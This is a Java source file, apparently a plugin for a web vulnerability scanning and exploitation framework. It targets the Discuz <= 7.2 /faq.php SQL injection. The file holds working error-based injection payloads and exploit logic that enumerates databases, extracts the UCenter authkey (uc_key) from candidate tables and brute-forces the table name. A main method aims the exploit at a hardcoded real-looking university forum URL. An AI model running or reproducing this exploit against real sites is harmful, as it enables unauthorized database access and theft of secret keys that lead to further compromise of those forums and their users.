package cn.com.nike.policy.policy;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.commons.codec.digest.DigestUtils;
import org.apache.commons.lang.StringUtils;
import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;

import cn.com.nike.policy.base.Policy;
import cn.com.nike.policy.base.PolicyInfo;
import cn.com.nike.policy.bean.ParameterConstant;
import cn.com.nike.policy.bean.WebVulnData;
import cn.com.nike.policy.util.PolicyUtil;

public class Discuz_72_Injection_RetrieveUc_key extends PolicyInfo implements Policy {

	private String url = "";

	public Discuz_72_Injection_RetrieveUc_key() {
		POLICYNAME = Discuz_72_Injection_RetrieveUc_key.class.getName();
		POLICYID = "SSV-ID: 87114";
		POLICYCOMPANY = "DISCUZ";
		POLICYTIME = "2014-07-02";
		POLICYDESCRIPTION = "Discuz <= 7.2 /faq.php SQL注入漏洞获取uckey";
	}

	@Override
	public void setParameter(Map<String, Object> parameters) {

		url = parameters.get("url").toString();

		PAYLOAD_CHECK = "/faq.php?action=grouppermission&gids[99]='&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(md5(0x61646d696e),"
				+ "floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23";

		PAYLOAD_EXPLOIT = "/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28"
				+ "%28"
				+ "$$"
				+ "%29"
				+ ",floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23";
	}

	@Override
	public boolean check() throws IOException {
		CloseableHttpClient httpclient = HttpClients.createDefault();
		CloseableHttpResponse response = null;
		try {
			HttpGet httpget = new HttpGet(url + PAYLOAD_CHECK);
			response = httpclient.execute(httpget);
			HttpEntity entity = response.getEntity();
			int code = response.getStatusLine().getStatusCode();
			String content = EntityUtils.toString(entity);
			if (code == 200 && content.contains(DigestUtils.md5Hex("admin"))) {
				log.info("存在注入");
				return true;
			}

		} catch (Exception e) {
			log.error("检测异常", e);
		} finally {
			if (response != null)
				response.close();
			httpclient.close();
		}

		return false;
	}

	@Override
	public WebVulnData exploit() throws IOException {

		WebVulnData webVulnData = new WebVulnData();
		List<String> dbs = PolicyUtil.listDbs(url,PAYLOAD_EXPLOIT, "Duplicate entry '(.*?)1'", 1);
		CloseableHttpClient httpclient = HttpClients.createDefault();
		CloseableHttpResponse response = null;
		String uckey = "";
		try {
			for (String db : dbs) {
				String payload = "select%20substr(authkey,1,64)%20from%20"+db+".uc_applications%20limit%201";
				String payload1 = "select%20substr(authkey,1,64)%20from%20"+db+".cdb_uc_applications%20limit%201";
				String payload2 = "select%20substr(authkey,1,64)%20from%20"+db+".ucapplications%20limit%201";
				log.info("check databasename :"+db);
				payload = PAYLOAD_EXPLOIT.replace("$$", payload);
				
				HttpGet httpget = new HttpGet(url + payload);
				response = httpclient.execute(httpget);
				String content = EntityUtils.toString(response.getEntity());
				boolean flag = false;
				
				if (content.contains("doesn't exist")){
					log.info("check payload 1");
					payload1 = PAYLOAD_EXPLOIT.replace("$$", payload1);
					httpget = new HttpGet(url + payload1);
					response = httpclient.execute(httpget);
					content = EntityUtils.toString(response.getEntity());
					if (!content.contains("doesn't exist")){
						flag = true;
					}else {
						log.info("check payload 2");
						payload2 = PAYLOAD_EXPLOIT.replace("$$", payload2);
						httpget = new HttpGet(url + payload2);
						response = httpclient.execute(httpget);
						content = EntityUtils.toString(response.getEntity());
						if (!content.contains("doesn't exist")){
							flag = true;
						}
					}
					
				}else{
					flag = true;
				}
				if(flag)
				{
					List<String> result = PolicyUtil.regex("Duplicate entry '(.*?)'", content, 1);
					if (result.size() == 1)
						uckey = result.get(0).trim();
					
					if (StringUtils.isEmpty(uckey)){
						log.info("not right");
						continue;
					}
					log.info("right uc_key="+uckey+" 对应数据库:"+db);
					break;
				}
				
			}
			if (StringUtils.isEmpty(uckey)){
				log.info("开启暴力破解 数据表 uckey");
				String name = PolicyUtil.listUcTableName(url, PAYLOAD_EXPLOIT, "Duplicate entry '(.*?)1'", 1);
				if (!StringUtils.isEmpty(name)){ 
				log.info("发现名称:"+name+" 开始获取uckey");
				for (String db : dbs) {
					String payload = "select%20substr(authkey,1,64)%20from%20"+db+"."+name+"%20limit%201";
					log.info("check databasename :"+db);
					payload = PAYLOAD_EXPLOIT.replace("$$", payload);
					HttpGet httpget = new HttpGet(url + payload);
					response = httpclient.execute(httpget);
					String content = EntityUtils.toString(response.getEntity());
					if (content.contains("doesn't exist")){
						log.info("not right");
						continue;
					}else{
						List<String> result = PolicyUtil.regex("Duplicate entry '(.*?)'", content, 1);
						if (result.size() == 1)
							uckey = result.get(0).trim();
						
						if (StringUtils.isEmpty(uckey)){
							log.info("not right");
							continue;
						}
						log.info("right uc_key="+uckey+" 对应数据库:"+db);
						break;
					}
					
				}
				}
			}
			
			if (!StringUtils.isEmpty(uckey)){
				Map<String, String> data = new HashMap<String, String>();
				data.put(ParameterConstant.UC_KEY, uckey);
				
				List<Map<String, String>> datas = new ArrayList<Map<String,String>>();
				datas.add(data);
				webVulnData.setResult(datas);
			}

		} catch (Exception e) {
			log.error("检测异常", e);
		} finally {
			if (response != null)
				response.close();
			httpclient.close();
		}

		return webVulnData;
	}

	public static void main(String[] args) throws IOException {

		Map<String, Object> parameters = new HashMap<String, Object>();
		parameters.put("url", "http://sz.jnu.edu.cn:8888/lvyouziyuan/bbs/");
		Discuz_72_Injection_RetrieveUc_key policy = new Discuz_72_Injection_RetrieveUc_key();
		policy.setParameter(parameters);
		if (policy.check())
			policy.exploit();

	}

}
